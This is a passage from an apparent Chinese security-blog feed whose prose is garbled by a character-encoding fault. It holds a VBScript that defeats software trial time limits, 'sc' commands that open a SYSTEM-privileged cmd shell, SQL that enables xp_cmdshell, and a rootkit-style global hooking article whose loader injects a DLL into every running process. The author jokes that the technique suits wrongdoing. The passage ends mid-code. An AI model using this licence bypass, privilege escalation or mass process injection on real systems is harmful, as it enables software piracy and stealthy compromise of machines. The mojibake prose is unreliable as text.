é—®é¢˜</h2><p>åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°idapythonè¿˜æ˜¯æœ‰ä¸€äº›é—®é¢˜ï¼Œä½¿ç”¨wineå®‰è£…Windowsçš„pythonåé—®é¢˜å¾—åˆ°è§£å†³ï¼Œä¸»è¦æ˜¯Cè¯­è¨€å†™çš„pythonæ¨¡å—çš„é—®é¢˜ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="http://www.openrce.org/forums/posts/463">http://www.openrce.org/forums/posts/463</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç ´è§£è½¯ä»¶æ—¶é—´é™åˆ¶çš„ç¨‹åº</title>
    <link href="/cn/crack_time_limit_software/"/>
    <url>/cn/crack_time_limit_software/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> daytime<br>daytime = <span class="hljs-built_in">formatdatetime</span>(<span class="hljs-built_in">now</span>(), <span class="hljs-number">2</span>)<br>wscript.echo <span class="hljs-string">&quot;Now is: &quot;</span> &amp; daytime<br>wscript.echo <span class="hljs-string">&quot;Change system data to 2010/12/18...&quot;</span><br><span class="hljs-keyword">Set</span> os =WScript.<span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;WScript.Shell&quot;</span>)<br>os.run <span class="hljs-string">&quot;cmd /c date 2010/12/18&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">True</span><br>wscript.sleep <span class="hljs-number">3000</span><br>wscript.echo <span class="hljs-string">&quot;Call some.exe&quot;</span><br>os.run <span class="hljs-string">&quot;.\some.exe&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">True</span><br>wscript.echo <span class="hljs-string">&quot;Restore system data to &quot;</span> &amp; daytime<br>os.run <span class="hljs-string">&quot;cmd /c date &quot;</span> &amp; daytime, <span class="hljs-number">0</span>, <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è·å–systemæƒé™çš„cmdshell</title>
    <link href="/cn/get_system_shell_windows/"/>
    <url>/cn/get_system_shell_windows/</url>
    
    <content type="html"><![CDATA[<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> Create SuperCMD binPath=<span class="hljs-string">&quot;cmd /K start&quot;</span> <span class="hljs-built_in">type</span>=own <span class="hljs-built_in">type</span>=interact<br><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> SuperCMD<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL Server 2005 xp_cmdshell</title>
    <link href="/cn/sqlserver2005_xpcmdshell/"/>
    <url>/cn/sqlserver2005_xpcmdshell/</url>
    
    <content type="html"><![CDATA[<p>SQL Server 2005 ä¸­å¼•å…¥çš„ xp_cmdshell é€‰é¡¹æ˜¯æœåŠ¡å™¨é…ç½®é€‰é¡¹ï¼Œ<br>ä½¿ç³»ç»Ÿç®¡ç†å‘˜èƒ½å¤Ÿæ§åˆ¶æ˜¯å¦å¯ä»¥åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œ xp_cmdshell æ‰©å±•å­˜å‚¨è¿‡ç¨‹ã€‚</p><h2 id="1-å¦‚ä½•åœ¨sql-server-2005-ä¸­å¼€å¯xp-cmdshell"><a href="#1-å¦‚ä½•åœ¨sql-server-2005-ä¸­å¼€å¯xp-cmdshell" class="headerlink" title="1.  å¦‚ä½•åœ¨sql server 2005 ä¸­å¼€å¯xp_cmdshell"></a>1.  å¦‚ä½•åœ¨sql server 2005 ä¸­å¼€å¯xp_cmdshell</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- To allow advanced options to be changed.</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span><br>GO<br><span class="hljs-comment">-- To update the currently configured value for advanced options.</span><br>RECONFIGURE<br>GO<br><span class="hljs-comment">-- To enable the feature.</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span><br>GO<br><span class="hljs-comment">-- To update the currently configured value for this feature.</span><br>RECONFIGURE<br>GO<br></code></pre></td></tr></table></figure><h2 id="2-å¦‚ä½•æŸ¥è¯¢sql-server-2005-æ‹“å±•å­˜å‚¨è¿‡ç¨‹xp-cmdshell-çŠ¶æ€"><a href="#2-å¦‚ä½•æŸ¥è¯¢sql-server-2005-æ‹“å±•å­˜å‚¨è¿‡ç¨‹xp-cmdshell-çŠ¶æ€" class="headerlink" title="2. å¦‚ä½•æŸ¥è¯¢sql server 2005 æ‹“å±•å­˜å‚¨è¿‡ç¨‹xp_cmdshell çŠ¶æ€"></a>2. å¦‚ä½•æŸ¥è¯¢sql server 2005 æ‹“å±•å­˜å‚¨è¿‡ç¨‹xp_cmdshell çŠ¶æ€</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> sys.configurations <span class="hljs-keyword">where</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span><br>GO<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹valueçš„å€¼ï¼Œ 1 ä¸ºå¼€å¯ï¼Œ 0 ä¸ºå…³é—­</p><h2 id="3-å¦‚ä½•æŸ¥çœ‹publicè§’è‰²å¯¹å“ªäº›æ‹“å±•å­˜å‚¨è¿‡ç¨‹æœ‰æ‰§è¡Œæƒé™"><a href="#3-å¦‚ä½•æŸ¥çœ‹publicè§’è‰²å¯¹å“ªäº›æ‹“å±•å­˜å‚¨è¿‡ç¨‹æœ‰æ‰§è¡Œæƒé™" class="headerlink" title="3. å¦‚ä½•æŸ¥çœ‹publicè§’è‰²å¯¹å“ªäº›æ‹“å±•å­˜å‚¨è¿‡ç¨‹æœ‰æ‰§è¡Œæƒé™"></a>3. å¦‚ä½•æŸ¥çœ‹publicè§’è‰²å¯¹å“ªäº›æ‹“å±•å­˜å‚¨è¿‡ç¨‹æœ‰æ‰§è¡Œæƒé™</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> sysusers.name, sysobjects.name, sysprotects.action <span class="hljs-keyword">from</span> sysobjects, sysusers, sysprotects<br><span class="hljs-keyword">where</span> sysobjects.id<span class="hljs-operator">=</span>sysprotects.id <span class="hljs-keyword">and</span> sysprotects.uid <span class="hljs-operator">=</span> sysusers.uid <span class="hljs-keyword">and</span> <br>sysprotects.protecttype<span class="hljs-operator">=</span><span class="hljs-number">205</span> <span class="hljs-keyword">and</span> sysprotects.action<span class="hljs-operator">=</span> <span class="hljs-number">224</span> <span class="hljs-keyword">and</span> (sysusers.name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;public&#x27;</span> <span class="hljs-keyword">or</span><br>sysusers.name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;guest&#x27;</span> ) <span class="hljs-keyword">and</span> sysobjects.type<span class="hljs-operator">=</span><span class="hljs-string">&#x27;X&#x27;</span><br><br>GO<br></code></pre></td></tr></table></figure><h2 id="4-å¦‚ä½•å»æ‰publicè§’è‰²å¯¹æ‹“å±•å­˜å‚¨è¿‡ç¨‹çš„æ‰§è¡Œæƒé™"><a href="#4-å¦‚ä½•å»æ‰publicè§’è‰²å¯¹æ‹“å±•å­˜å‚¨è¿‡ç¨‹çš„æ‰§è¡Œæƒé™" class="headerlink" title="4. å¦‚ä½•å»æ‰publicè§’è‰²å¯¹æ‹“å±•å­˜å‚¨è¿‡ç¨‹çš„æ‰§è¡Œæƒé™"></a>4. å¦‚ä½•å»æ‰publicè§’è‰²å¯¹æ‹“å±•å­˜å‚¨è¿‡ç¨‹çš„æ‰§è¡Œæƒé™</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">deny <span class="hljs-keyword">execute</span> <span class="hljs-keyword">on</span> xp_dirtree <span class="hljs-keyword">to</span> public<br>GO<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æŒ‚é’© NtResumeThread å®ç°å…¨å±€Hook</title>
    <link href="/cn/hook_ntResume/"/>
    <url>/cn/hook_ntResume/</url>
    
    <content type="html"><![CDATA[<p>æŒ‚é’©ä¸€ç›´æ˜¯Hack ç¼–ç¨‹ä¸­æ°¸æ’çš„ä¸»é¢˜ï¼ŒåŸºæœ¬é«˜çº§çš„Rootkit ç¨‹åºå¤šå¤šå°‘å°‘éƒ½ä¼šä½¿ç”¨Hook æŠ€æœ¯ã€‚<br>ä¼¼ä¹Hook éƒ½è¢«è®²çƒ‚äº†ï¼Œä¸è®ºæ˜¯Ring3 çš„è¿˜æ˜¯Ring0 çš„ç½‘ä¸Šéƒ½æœ‰ä¾‹å­ã€‚Ring0 çš„æ¯‹åº¸ç½®ç–‘å½“ç„¶<br>æ˜¯å…¨å±€çš„äº†ï¼Œè¿™é‡Œè¯´è¯´ring3 çš„å…¨å±€hookã€‚Ring 3 æœ‰Ring 3 çš„ä¼˜åŠ¿ï¼Œç¨³å®šæ˜¯å‹å€’ä¸€åˆ‡çš„ï¼Œ<br>å› æ­¤Mcafee å’Œå…¶ä»–ä¸€äº›å•†ä¸šçš„å®‰å…¨è½¯ä»¶éƒ½è¿˜æ˜¯ä½¿ç”¨äº†Ring3 çš„Hook æŠ€æœ¯ï¼Œæ— è®ºå¦‚ä½•ç”¨æˆ·æ˜¯<br>æ— æ³•æ¥å—è“å±å’Œæ­»æœºçš„ã€‚</p><p>æ„Ÿå…´è¶£çš„å¯ä»¥è£…ä¸ªRootkit unhooker è‡ªå·±çœ‹çœ‹ã€‚ :)</p><h2 id="1-ä»¥å¾€çš„Ring-3å…¨å±€Hook"><a href="#1-ä»¥å¾€çš„Ring-3å…¨å±€Hook" class="headerlink" title="1. ä»¥å¾€çš„Ring 3å…¨å±€Hook"></a>1. ä»¥å¾€çš„Ring 3å…¨å±€Hook</h2><p>çºµè§‚ç½‘ä¸Šæµè¡Œçš„å…¨å±€Hook ç¨‹åºéƒ½åªç”¨äº†ä¸€ä¸ªWindows APIï¼Œ SetWindowsHookExï¼Œæ­¤å‡½æ•°åŸå‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(      </span><br><span class="hljs-params">    <span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params">    HOOKPROC lpfn,</span><br><span class="hljs-params">    HINSTANCE hMod,</span><br><span class="hljs-params">    DWORD dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">idhook   å®‰è£…çš„é’©å­ç±»å‹ï¼Œå¦‚ WH_GETMESSAGEï¼ŒWH_KEYBOARD ç­‰<br>lpfn     hook <span class="hljs-function"><span class="hljs-keyword">procedure</span> çš„æŒ‡é’ˆ</span><br><span class="hljs-function"><span class="hljs-title">hmod</span>     åŒ…å« <span class="hljs-title">hook</span> <span class="hljs-title">procedure</span> <span class="hljs-title">DLL</span> çš„<span class="hljs-title">handle</span></span><br><span class="hljs-function"><span class="hljs-title">dwThread</span> ä¸º0</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªè¿™ä¸ªAPI æ—¶å€™æœ‰é—®é¢˜çš„ï¼Œåªèƒ½æŒ‚æ¥ç³»ç»Ÿä¸­çš„æ‰€æœ‰G U Içº¿ç¨‹ï¼Œæ¢å¥é€šä¿—çš„è¯è¯´å°±æ˜¯æœ‰ç•Œé¢<br>çš„ç¨‹åºï¼ŒWindows console ç±»çš„ç¨‹åºå°±æ— èƒ½ä¸ºåŠ›äº†ã€‚</p><p>è¿˜æœ‰ä¸€ç§é€šè¿‡æ’å…¥æ³¨å†Œè¡¨æ¥å®ç°</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs<br></code></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•ç®€å•ï¼Œä½†æ˜¯è¿˜æ˜¯åªèƒ½æŒ‚é’©GUI ç¨‹åºï¼Œå¹¶ä¸”è¿™ä¸ªé”®å€¼å·²ç»è¢«å¹¿å¤§HIPS æ‰€å…³æ³¨ï¼ŒåƒåŠ›ä¸è®¨å¥½ã€‚</p><p>ä»¥ä¸Šä¸¤ç§æ•ˆæœä¸å¥½ï¼Œå› æ­¤æœ‰äººæœ‰å¼€å§‹å¦å¤–çš„åšæ³•ï¼Œæšä¸¾æ‰€æœ‰è¿›ç¨‹ï¼Œæ’å…¥å’ŒæŒ‚é’© NtCreateProcess<br>è¿™æ˜¯éå¸¸è‡ªç„¶çš„æƒ³æ³•ï¼Œä¼¼ä¹ä¹ŸæŠŠé—®é¢˜è§£å†³äº†ï¼Œä½†æ˜¯ä»”ç»†æ€è€ƒä¸€ä¸‹ï¼Œå°±ä¼šå‘ç°å¾ˆå¤šé—®é¢˜ã€‚</p><p>a. æ—¶æœºä¸å¯¹ï¼Œåœ¨NtCreateProcesså‡½æ•°è¢«è°ƒç”¨æ—¶è¿›ç¨‹å¹¶æ²¡æœ‰çœŸæ­£è¢«åˆ›å»ºï¼Œæˆ‘ä»¬æ— æ³•æ‰§è¡ŒHOOKæ“ä½œï¼Œ<br>   è€Œå½“NtCreateProcessè¿”å›æ—¶ï¼Œè¿›ç¨‹åˆå·²ç»å¼€å§‹è¿è¡Œ</p><p>b. å¦‚æœæ˜¯Windows console åˆ›å»ºçš„è¿›ç¨‹ï¼Œä½ å¦‚ä½•å»ç›‘æ§è¿™ä¸ªè°ƒç”¨å‘¢ï¼Ÿè¿™ä¹ˆè¯´ä¼¼ä¹æ¯”è¾ƒæŠ½è±¡ï¼Œä½ å¯<br>   ä»¥è¿™ä¹ˆç†è§£ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œä¸‹ï¼Œcmdï¼Œcmdï¼Œcmd â€¦. ä½ å¯ä»¥ç›‘æ§åˆ°æœ€åä¸€ä¸ªcmd å—ï¼Œå¦‚æœåª<br>   ç”¨SetWindowsHookEx</p><p>c. æ˜¯å¦æ­£å¥½ç«™åœ¨äº†åå®¹é“ï¼Œæ˜¯å¦è¶³å¤Ÿåº•å±‚ã€‚</p><p>ä¼¼ä¹å¾ˆè´¹åŠ²</p><h2 id="2-åˆ†æç³»ç»Ÿåˆ›å»ºè¿›ç¨‹è¿‡ç¨‹ï¼Œå¯»æ‰¾æ–¹æ³•"><a href="#2-åˆ†æç³»ç»Ÿåˆ›å»ºè¿›ç¨‹è¿‡ç¨‹ï¼Œå¯»æ‰¾æ–¹æ³•" class="headerlink" title="2. åˆ†æç³»ç»Ÿåˆ›å»ºè¿›ç¨‹è¿‡ç¨‹ï¼Œå¯»æ‰¾æ–¹æ³•"></a>2. åˆ†æç³»ç»Ÿåˆ›å»ºè¿›ç¨‹è¿‡ç¨‹ï¼Œå¯»æ‰¾æ–¹æ³•</h2><p>å…³äºè¿™æ–¹é¢å†…å®¹ï¼Œå¯ä»¥å‚è€ƒæ¯›å¾·æ“è€å¸ˆçš„ä¸¤ç¯‡æ–‡ç« </p><p>ã€Šæ¼«è°ˆå…¼å®¹å†…æ ¸ä¹‹åä¸ƒ:å†è°ˆWindowsçš„è¿›ç¨‹åˆ›å»ºã€‹<br>ã€Šæ¼«è°ˆå…¼å®¹å†…æ ¸ä¹‹äºŒåäºŒ:Windowsçº¿ç¨‹çš„è°ƒåº¦å’Œè¿è¡Œã€‹</p><p>ä¸‹é¢æ˜¯ä»–çš„blog é“¾æ¥ï¼š<br><a href="http://hi.baidu.com/fatbsd/blog">http://hi.baidu.com/fatbsd/blog</a></p><p>CreateProcess æ˜¯ Kernel32.dll çš„å¯¼å‡ºå‡½æ•°ã€‚</p><p>æ“èµ·WinDbgï¼Œå‰äº†ä¸€ä¸‹ï¼š Windows 2003 SP2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs asm">lkd&gt; uf CreateProcessW<br>kernel32!CreateProcessW:<br>7c802474 8bff             mov     edi,edi<br>7c802476 55               push    ebp<br>7c802477 8bec             mov     ebp,esp<br>7c802479 6a00             push    0x0<br>7c80247b ff752c           push    dword ptr [ebp+0x2c]<br>7c80247e ff7528           push    dword ptr [ebp+0x28]<br>7c802481 ff7524           push    dword ptr [ebp+0x24]<br>7c802484 ff7520           push    dword ptr [ebp+0x20]<br>7c802487 ff751c           push    dword ptr [ebp+0x1c]<br>7c80248a ff7518           push    dword ptr [ebp+0x18]<br>7c80248d ff7514           push    dword ptr [ebp+0x14]<br>7c802490 ff7510           push    dword ptr [ebp+0x10]<br>7c802493 ff750c           push    dword ptr [ebp+0xc]<br>7c802496 ff7508           push    dword ptr [ebp+0x8]<br>7c802499 6a00             push    0x0<br>7c80249b e8a6ac0200       call    kernel32!CreateProcessInternalW (7c82d146)<br>7c8024a0 5d               pop     ebp<br>7c8024a1 c22800           ret     0x28<br><br>lkd&gt; uf CreateProcessInternalW<br>....<br>7c82cf8f ff159814807c call dword ptr [kernel32!_imp__NtCreateProcessEx (7c801498)]<br>....<br>7c82daa2 ff159414807c call dword ptr [kernel32!_imp__NtCreateThread (7c801494)]<br>....<br>7c82dbdc ff158814807c call dword ptr [kernel32!_imp__NtResumeThread (7c801488)]<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚æµç¨‹å¦‚ä¸‹:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Kernel32!CreateProcessW<br>Kernel32!CreateProcessInternalW<br>ntdll!NtCreateProcessEx<br>ntdll!NtCreateThread<br>ntdll!NtResumeThread<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¿›ç¨‹åˆ›å»ºåï¼ŒWindows å¿…é¡»ä¸ºå®ƒåˆ›å»ºä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œç„¶åç­‰å¾…æ“ä½œç³»ç»Ÿè°ƒåº¦å®ƒã€‚æ‰€ä»¥è°ƒç”¨NtResumeThreadçš„æ—¶å€™ï¼Œå°±æ˜¯æˆ‘ä»¬Hookçš„æœ€ä½³æ—¶æœºï¼Œå› ä¸ºæ­¤æ—¶åˆ›å»ºè¿›ç¨‹çš„ä¸»è¦å·¥ä½œå·²ç»å®Œæˆï¼Œä½†æ˜¯è¿›ç¨‹å¹¶æ²¡æœ‰è°ƒåº¦èµ·æ¥ï¼Œå‘µå‘µï¼Œæ–¹ä¾¿å¹²åäº‹å•Šã€‚</p><h2 id="3-å…·ä½“ä»£ç å®ç°"><a href="#3-å…·ä½“ä»£ç å®ç°" class="headerlink" title="3. å…·ä½“ä»£ç å®ç°"></a>3. å…·ä½“ä»£ç å®ç°</h2><p>åŸºæœ¬æ€è·¯å·²ç»æ¸…æ™°äº†ï¼Œè¿™é‡Œè¿˜å‡ ä¸ªé—®é¢˜ã€‚</p><p>a. NtResumeThread å‡½æ•°å¹¶ä¸æ˜¯åˆ›å»ºè¿›ç¨‹æ‰è°ƒç”¨ï¼Œæˆ‘ä»¬æ€ä¹ˆåŒºåˆ†å‡ºå“ªä¸ªæ˜¯åˆ›å»ºè¿›ç¨‹æ—¶<br>   è°ƒç”¨çš„NtResumeThreadå‘¢ï¼Ÿ</p><p>å…¶å®ç°å®èµ·æ¥ä¸å›°éš¾ï¼Œå…ˆæšä¸¾ç³»ç»Ÿè¿›ç¨‹ä¸€æ¬¡ï¼Œå°†ç³»ç»Ÿè¿›ç¨‹ä¸­NtResumeThread éƒ½æŒ‚é’©ä¸Šã€‚æ¯æ¬¡æ‹¦æˆªåˆ°<br>NTResumeThread æ˜¯åˆ¤æ–­NtResumeThread çš„å¤´å‡ ä¸ªå­—èŠ‚æ˜¯å¦å·²ç»è¢«ä¿®æ”¹ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ˜¯åˆ›å»ºæ–°è¿›ç¨‹çš„è°ƒç”¨ã€‚</p><p>b. ç”¨ä»€ä¹ˆæ–¹æ³•Hook ï¼Œ IATã€Inlineï¼Ÿ æ€»çš„æ¶æ„ï¼Ÿ</p><p>  è¿™ç§ä»£ç å†™èµ·æ¥è¿˜æ˜¯Inline Hook æ¥çš„èˆ’æœï¼Œä¿®æ”¹å‡½æ•°è°ƒç”¨å¤´å‡ ä¸ªå­—èŠ‚ã€‚<br>  æšä¸¾ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹æ˜¯ä¸å¯é¿å…çš„ï¼Œå› æ­¤è¦å†™ä¸ªloader å°†æˆ‘ä»¬ç¼–å†™çš„DLL æ’å…¥ç³»ç»Ÿæ‰€æœ‰è¿›ç¨‹ã€‚å‘ç°æœ‰è¿›è¿›ç¨‹<br>  åˆ›å»ºæ—¶ï¼Œå°†DLL æ’å…¥æ–°è¿›ç¨‹ã€‚</p><p>  ä¸‹é¢ä»£ç æ¼”ç¤ºï¼ŒHook NtQuerySystemInformationï¼Œå› ä¸ºç¯‡å¹…ç­‰åŸå› åªæœ‰æ•´ä½“æ¡†æ¶å’Œå…³é”®ä»£ç ã€‚<br>  Hook ä¹Ÿä¸æ˜¯ä¸æ˜¯æˆ‘ä»¬è¿™æ¬¡çš„ä¸»è¦å†…å®¹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å‚è€ƒ</p><p>  <a href="http://www.xfocus.net/articles/200403/681.html">http://www.xfocus.net/articles/200403/681.html</a></p><p>c. åœ¨å¤šçº¿ç¨‹çš„ç¯å¢ƒä¸‹æ˜¯å¦å¯é ï¼Ÿ</p><p>  ä½¿ç”¨å…³é”®ä»£ç æ®µï¼Œäº’æ–¥é”ï¼Œæ•ˆæœè¿˜å¯ä»¥ã€‚</p><p>Loaderï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(HANDLE hProcess)</span>&#123;<br><br><span class="hljs-type">char</span> CurPath[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-built_in">strcpy</span>(CurPath, <span class="hljs-string">&quot;C:\\WINDOWS\\system32\\Hook.dll&quot;</span>);<br>    PWSTR pszLibFileRemote = <span class="hljs-literal">NULL</span>;<br><br><br>    <span class="hljs-type">int</span> len = (lstrlen(CurPath)+<span class="hljs-number">1</span>)*<span class="hljs-number">2</span>;<br>    WCHAR wCurPath[<span class="hljs-number">256</span>];<br>    MultiByteToWideChar(CP_ACP,<span class="hljs-number">0</span>,CurPath,<span class="hljs-number">-1</span>,wCurPath,<span class="hljs-number">256</span>);<br><br>    pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess,<br>                                             <span class="hljs-literal">NULL</span>,<br>                                             len,<br>                                             MEM_COMMIT,<br>                                             PAGE_READWRITE);<br><br>    WriteProcessMemory(hProcess, pszLibFileRemote,<br>            (PVOID) wCurPath, len, <span class="hljs-literal">NULL</span>);<br><br>    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)<br>        GetProcAddress(GetModuleHandle(TEXT(<span class="hljs-string">&quot;Kernel32&quot;</span>)), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><br>    CreateRemoteThread(hProcess,<br>                       <span class="hljs-literal">NULL</span>,<br>                       <span class="hljs-number">0</span>,    <br>                       pfnThreadRtn,<br>                       pszLibFileRemote,<br>                       <span class="hljs-number">0</span>,<br>                       <span class="hljs-literal">NULL</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TotalInject</span><span class="hljs-params">()</span><br>&#123;<br>    HANDLE         hProcessSnap = <span class="hljs-literal">NULL</span>;<br>    BOOL           bRet      = FALSE;<br>    PROCESSENTRY32 pe32      = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-comment">//  Take a snapshot of all processes in the system.</span><br>    EnableDebugPrivilege(<span class="hljs-number">1</span>);<br><br>    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)<br>        <span class="hljs-keyword">return</span>;<br><br>    <span class="hljs-comment">//  Fill in the size of the structure before using it.</span><br><br>    pe32.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br><br>    <span class="hljs-comment">//  Walk the snapshot of the processes, and for each process,</span><br>    <span class="hljs-comment">//  display information.</span><br><br>    <span class="hljs-keyword">if</span> (Process32First(hProcessSnap, &amp;pe32))<br>    &#123;<br><br>        <span class="hljs-keyword">do</span><br>        &#123;<br>                HANDLE hProcess;<br>                <span class="hljs-comment">// Get the actual priority class.</span><br>                hProcess = OpenProcess (PROCESS_ALL_ACCESS,<br>                                        FALSE,<br>                                       pe32.th32ProcessID);<br>        inject(hProcess);<br>        CloseHandle(hProcess);<br><br>        &#125;<br>        <span class="hljs-keyword">while</span> (Process32Next(hProcessSnap, &amp;pe32));<br><br>    &#125;<br><br>    <span class="hljs-comment">// Do not forget to clean up the snapshot object.</span><br>        EnableDebugPrivilege(<span 